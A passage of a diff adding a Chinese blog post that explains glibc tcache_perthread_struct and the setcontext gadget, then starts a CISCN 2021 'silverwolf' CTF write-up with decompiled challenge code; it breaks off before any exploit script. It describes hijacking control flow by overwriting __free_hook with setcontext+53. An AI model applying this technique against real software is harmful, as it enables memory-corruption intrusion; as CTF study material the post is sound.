@@ -1,0 +1,778 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/128.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="yyyffff">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="tcache_perthread_struct（glibc-2.27） 123456789101112131415typedef struct tcache_entry&#123;  struct tcache_entry *next;&#125; tcache_entry;&#x2F;* There is one of these for each thread, which contains the">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探tcache_perthread_struct与setcontext">
+<meta property="og:url" content="http://yyyffff.github.io/2026/02/11/%E5%88%9D%E6%8E%A2tcache_perthread_struct%E4%B8%8Esetcontext/index.html">
+<meta property="og:site_name" content="yyyffff&#39;s blog">
+<meta property="og:description" content="tcache_perthread_struct（glibc-2.27） 123456789101112131415typedef struct tcache_entry&#123;  struct tcache_entry *next;&#125; tcache_entry;&#x2F;* There is one of these for each thread, which contains the">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/ad_struct%E4%B8%8Esetcontext/1770808577021.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/ad_struct%E4%B8%8Esetcontext/1770811309784.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/ad_struct%E4%B8%8Esetcontext/1770811786466.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/ad_struct%E4%B8%8Esetcontext/1770812356227.png">
+<meta property="article:published_time" content="2026-02-11T07:51:19.000Z">
+<meta property="article:modified_time" content="2026-02-11T12:20:39.489Z">
+<meta property="article:author" content="yyyffff">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/ad_struct%E4%B8%8Esetcontext/1770808577021.png">
+  
+  
+  
+  <title>初探tcache_perthread_struct与setcontext - yyyffff&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yyyffff.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"2bkS2AvQTqNk4TIsyxh4ew9q-gzGzoHsz","app_key":"GfRH0zMaM1USTNT6w25DTqu8","server_url":"https://2bks2avq.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>yyyffff</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="初探tcache_perthread_struct与setcontext"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-11 15:51" pubdate>
+          2026年2月11日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">初探tcache_perthread_struct与setcontext</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h1><p>（glibc-2.27）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure>
+
+<p>其中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS		64</span><br></code></pre></td></tr></table></figure>
+
+<p>在程序中就是一块0x250的堆块来记录每个大小的tcache中的数量以及第一个指针</p>
+<p>比如</p>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/ad_struct%E4%B8%8Esetcontext/1770808577021.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中对应的<code>tcache_perthread_struct</code> 结构体就长这样</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>x5<span class="hljs-number">55555605000</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x0000<span class="hljs-number">000000000251</span> --&gt;size位<br>-------<br><span class="hljs-number">0</span>x5<span class="hljs-number">55555605010</span>:	<span class="hljs-number">0</span>x0007<span class="hljs-number">070100000007</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">20003000000</span> --&gt;比如<span class="hljs-number">0x00 07 07</span> <span class="hljs-number">01 00 00 00</span> <span class="hljs-number">07</span> 从右到左分别是 <span class="hljs-number">0x20 0x30</span> <span class="hljs-number">0x40 0x50</span> 大小的free chunk的数量，<span class="hljs-number">0</span>x10是<span class="hljs-number">7</span>....<br><span class="hljs-number">0</span>x5<span class="hljs-number">55555605020</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x5<span class="hljs-number">55555605030</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x5<span class="hljs-number">55555605040</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br>-------以上记录的都是counts，也就是数量<br><span class="hljs-number">0</span>x5<span class="hljs-number">55555605050</span>:	<span class="hljs-number">0</span>x00005<span class="hljs-number">55555606610</span>(<span class="hljs-number">0</span>x20)	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> 这里记录指针，也是从<span class="hljs-number">0</span>x20开始(<span class="hljs-number">0</span>x30)<br><span class="hljs-number">0</span>x5<span class="hljs-number">55555605060</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>(<span class="hljs-number">0</span>x40)	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>(<span class="hljs-number">0</span>x50)<br><span class="hljs-number">0</span>x5<span class="hljs-number">55555605070</span>:	<span class="hljs-number">0</span>x000055<span class="hljs-number">55556068c0</span>(<span class="hljs-number">0</span>x60)	<span class="hljs-number">0</span>x00005<span class="hljs-number">55555606360</span><br><span class="hljs-number">0</span>x5<span class="hljs-number">55555605080</span>:	<span class="hljs-number">0</span>x00005<span class="hljs-number">55555605e90</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x5<span class="hljs-number">55555605090</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>
+
+<p>如果能控制这一块，就可以实现任意写等效果。</p>
+<h1 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000052180</span>                 public setcontext ; weak<br>.text:<span class="hljs-number">0000000000052180</span> setcontext      proc near               ; CODE XREF: sub_587B0+C↓p<br>.text:<span class="hljs-number">0000000000052180</span>                                         ; DATA XREF: LOAD:<span class="hljs-number">0000000000009018</span>↑o<br>.text:<span class="hljs-number">0000000000052180</span> ; __unwind &#123;<br>.text:<span class="hljs-number">0000000000052180</span>                 push    rdi<br>.text:<span class="hljs-number">0000000000052181</span>                 lea     rsi, [rdi+<span class="hljs-number">128</span>h] ; nset<br>.text:<span class="hljs-number">0000000000052188</span>                 xor     edx, edx        ; oset<br>.text:<span class="hljs-number">000000000005218</span>A                 mov     edi, <span class="hljs-number">2</span>          ; how<br>.text:<span class="hljs-number">000000000005218F</span>                 mov     r10d, <span class="hljs-number">8</span>         ; sigsetsize<br>.text:<span class="hljs-number">0000000000052195</span>                 mov     eax, <span class="hljs-number">0</span>Eh<br>.text:<span class="hljs-number">000000000005219</span>A                 syscall                 ; LINUX - sys_rt_sigprocmask<br>.text:<span class="hljs-number">000000000005219</span>C                 pop     rdi<br>.text:<span class="hljs-number">000000000005219</span>D                 cmp     rax, <span class="hljs-number">0F</span>FFFFFFFFFFFF001h<br>.text:<span class="hljs-number">00000000000521</span>A3                 jnb     <span class="hljs-type">short</span> loc_52200<br>.text:<span class="hljs-number">00000000000521</span>A5                 mov     rcx, [rdi+<span class="hljs-number">0E0</span>h]<br>.text:<span class="hljs-number">00000000000521</span>AC                 fldenv  byte ptr [rcx]<br>.text:<span class="hljs-number">00000000000521</span>AE                 ldmxcsr dword ptr [rdi+<span class="hljs-number">1</span>C0h]<br>.text:<span class="hljs-number">00000000000521B</span>5                 mov     rsp, [rdi+<span class="hljs-number">0</span>A0h]<br>.text:<span class="hljs-number">00000000000521B</span>C                 mov     rbx, [rdi+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">00000000000521</span>C3                 mov     rbp, [rdi+<span class="hljs-number">78</span>h]<br>.text:<span class="hljs-number">00000000000521</span>C7                 mov     r12, [rdi+<span class="hljs-number">48</span>h]<br>.text:<span class="hljs-number">00000000000521</span>CB                 mov     r13, [rdi+<span class="hljs-number">50</span>h]<br>.text:<span class="hljs-number">00000000000521</span>CF                 mov     r14, [rdi+<span class="hljs-number">58</span>h]<br>.text:<span class="hljs-number">00000000000521</span>D3                 mov     r15, [rdi+<span class="hljs-number">60</span>h]<br>.text:<span class="hljs-number">00000000000521</span>D7                 mov     rcx, [rdi+<span class="hljs-number">0</span>A8h]<br>.text:<span class="hljs-number">00000000000521</span>DE                 push    rcx<br>.text:<span class="hljs-number">00000000000521</span>DF                 mov     rsi, [rdi+<span class="hljs-number">70</span>h]<br>.text:<span class="hljs-number">00000000000521E3</span>                 mov     rdx, [rdi+<span class="hljs-number">88</span>h]<br>.text:<span class="hljs-number">00000000000521</span>EA                 mov     rcx, [rdi+<span class="hljs-number">98</span>h]<br>.text:<span class="hljs-number">00000000000521F</span>1                 mov     r8, [rdi+<span class="hljs-number">28</span>h]<br>.text:<span class="hljs-number">00000000000521F</span>5                 mov     r9, [rdi+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">00000000000521F</span>9                 mov     rdi, [rdi+<span class="hljs-number">68</span>h]<br></code></pre></td></tr></table></figure>
+
+<p>一般从 setcontext+53 开始用，因为 fldenv byte pte [rcx] 会造成程序执行时直接 crash 。</p>
+<p>通过这个，我们只要控制 rdi，就可以控制 rsp 等一系列寄存器，通过控制 rsp+ret 我们就可以控制程序流。</p>
+<p>通常与 free 搭配使用，将 free_hook 覆盖成 setcontext+53，然后执行 free，此时 rdi 就指向我们正在 free 的 chunk，我们只要在这个 chunk 上布置好数据，就可以控制 rsp 等一系列寄存器</p>
+<p>需要注意的是，如果我们控制的是 rsp 寄存器，这里的 push rcx 会对其造成影响</p>
+<h1 id="CISCN-2021-初赛-silverwolf"><a href="#CISCN-2021-初赛-silverwolf" class="headerlink" title="[CISCN 2021 初赛]silverwolf"></a>[CISCN 2021 初赛]silverwolf</h1><p>64位动态链接，保护全开，并且沙箱只允许 open read write</p>
+<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  _QWORD v3[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br><br>  v3[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  init_sandbox();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. allocate&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. show&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5. exit&quot;</span>);<br>    __printf_chk(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(&amp;unk_1144, v3);<br>    <span class="hljs-keyword">switch</span> ( v3[<span class="hljs-number">0</span>] )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1LL</span>:<br>        add();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2LL</span>:<br>        edit();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3LL</span>:<br>        show();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4LL</span>:<br>        delete();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5LL</span>:<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Unknown&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// add函数 - 分配堆内存</span><br><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">size_t</span> size_1; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">void</span> *heap_buffer; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [rsp+0h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-10h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  __printf_chk(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(&amp;unk_1144, &amp;size);             <span class="hljs-comment">// idx只能为0</span><br>  <span class="hljs-keyword">if</span> ( !size )<br>  &#123;<br>    __printf_chk(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Size: &quot;</span>);<br>    __isoc99_scanf(&amp;unk_1144, &amp;size);<br>    size_1 = size;<br>    <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x78</span> )                          <span class="hljs-comment">// 最多0x78</span><br>    &#123;<br>      __printf_chk(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Too large&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      heap_buffer = <span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> ( heap_buffer )<br>      &#123;<br>        alloc_size = size_1;<br>        ::heap_buffer = heap_buffer;            <span class="hljs-comment">// 总是记录最后分配的堆块</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;allocate failed&quot;</span>);<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// edit函数 - 编辑堆内存内容</span><br><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE *buf; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">char</span> *v1; <span class="hljs-comment">// rbp</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-20h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  __printf_chk(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(&amp;unk_1144, &amp;v3);               <span class="hljs-comment">// 这里也是，只能输入0</span><br>  <span class="hljs-keyword">if</span> ( !v3 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( heap_buffer )<br>    &#123;<br>      __printf_chk(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Content: &quot;</span>);<br>      buf = heap_buffer;<br>      <span class="hljs-keyword">if</span> ( alloc_size )<br>      &#123;<br>        v1 = (<span class="hljs-type">char</span> *)heap_buffer + alloc_size;<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1u</span>);<br>          <span class="hljs-keyword">if</span> ( *buf == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">if</span> ( ++buf == v1 )<br>            <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v4;<br>        &#125;<br>        *buf = <span class="hljs-number">0</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="show"><a href="#show" class="headerlink" title="show"></a>show</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// show函数 - 显示堆内存内容</span><br><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">show</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+0h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-10h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  __printf_chk(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(&amp;unk_1144, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( !v1 